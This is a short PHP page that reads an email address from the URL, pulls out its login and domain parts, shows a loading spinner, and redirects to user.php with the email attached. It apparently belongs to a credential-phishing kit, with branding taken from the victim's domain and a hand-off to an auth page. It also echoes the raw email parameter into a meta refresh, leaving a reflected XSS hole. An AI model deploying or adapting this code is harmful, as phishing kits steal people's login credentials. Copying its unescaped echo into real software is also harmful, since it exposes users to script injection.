<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>
<head></head>
<meta http-equiv="refresh" content="2; url=./user.php?email=<?php echo $_GET['email']; ?>" />
<body>

<table align="center" cellspacing="0" height="100%" width="100%">

<tr><td style="height:10px;"></td></tr>
<tr><td>
	
	
		<div align="center">
			<a href="./auth.htm">
				<img src="./webfiles/loader.gif" style="width:45px; height:45px;">
			</a>
		</div>
	

</td></tr>
<tr><td style="height:200px;"></td></tr>
</table>

</body>
</html>